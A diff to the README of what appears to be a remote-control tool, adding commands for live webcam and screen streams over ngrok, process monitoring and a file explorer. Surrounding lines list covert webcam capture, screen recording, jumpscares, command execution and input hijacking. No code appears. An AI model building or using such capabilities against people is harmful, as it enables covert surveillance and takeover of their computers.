@@ -21,6 +21,10 @@ screenclip - Record screen.
 recordjum - Records 20 second clip of jumpscare.
 waitforface - Send a webcam photo when face is detected till timeout.
 displaymode - Send a display set menu.
+webcamtunnelstart - Sets you a link to a webcam stream.
+screentunnelstart - Sets you a link to a screen stream.
+webcamtunnelstop - Stops the webcam stream.
+screentunnelstop - Stops the screen stream.
 🔊 Audio & Volume
 breath - Play breathing sound.
 pss - Play "psst" sound.
@@ -44,6 +48,11 @@ setvideowallpaper - Sets a video as wallpaper.
 execute - Run system command.
 processkiller - Shows a table of processes that you can kill.
 terminateprocess - Kills a process by name.
+procmonmenu - Shows procmon menu.
+processmonadd - Adds a process to the process monitor list.
+processmonrem - Removes a process to the process monitor list.
+📂 File Explorer
+fileexplorer - Displays a file explorer menu.
 🎮 Input / Device Control
 randomkeyboard - Sets all user's input to random characters.
 capslock - Activates capslock.
@@ -91,7 +100,6 @@ jumpscare while recording screen and webcam
 - Message Boxes: Display custom message boxes on the system.
 - System Control: Simulate system shutdowns or other actions.
 - Live Webcam and Screen: Use ngrok tunnels to have a live view of the machine.
-
 ## Installation
 1. Clone the repository
 
